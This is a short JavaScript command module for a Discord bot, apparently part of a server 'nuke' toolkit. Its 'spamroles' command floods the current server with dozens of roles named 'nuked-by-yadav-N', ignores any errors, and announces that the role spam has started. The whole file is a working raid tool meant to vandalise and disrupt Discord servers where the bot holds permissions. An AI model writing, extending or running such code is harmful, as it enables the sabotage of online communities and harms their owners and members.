module.exports = {
  name: 'spamroles',
  description: 'Spam create roles',
  ownerOnly: true,
  async execute(message, args, client) {
    const guild = message.guild;
    if (!guild) return message.reply("❌ Not in a server.");

    const amount = parseInt(args[0]) || 50;
    message.reply(`🚀 Spamming ${amount} roles...`);

    for (let i = 0; i < amount; i++) {
      guild.roles.create({ 
        name: `nuked-by-yadav-${i}`,
        color: "RED"
      }).catch(() => {});
    }

    message.reply("✅ Role spam started.");
  }
};
